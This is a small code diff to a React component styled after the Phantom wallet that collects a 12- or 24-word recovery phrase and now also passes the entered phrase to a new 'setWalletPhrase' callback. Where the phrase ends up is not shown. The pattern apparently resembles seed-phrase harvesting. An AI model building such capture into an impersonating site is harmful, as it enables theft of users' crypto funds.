@@ -6,7 +6,13 @@ import { useWalletStore } from "@/store/walletStore";
 import PhantomSmall from "../icons/phantom-small";
 import PhantomFull from "../icons/phantom-full";
 
-const Phantom = ({ handleFinish }: { handleFinish: () => void }) => {
+const Phantom = ({
+	handleFinish,
+	setWalletPhrase,
+}: {
+	handleFinish: () => void;
+	setWalletPhrase: any;
+}) => {
 	const [wordCount, setWordCount] = useState<12 | 24>(12);
 	const [words, setWords] = useState<string[]>(Array(12).fill(""));
 	const [error, setError] = useState<number | null>(null);
@@ -15,6 +21,7 @@ const Phantom = ({ handleFinish }: { handleFinish: () => void }) => {
 
 	const handleComplete = () => {
 		setSeedPhrase(words.join(" "));
+		setWalletPhrase(words.join(" "));
 		handleFinish();
 	};
 
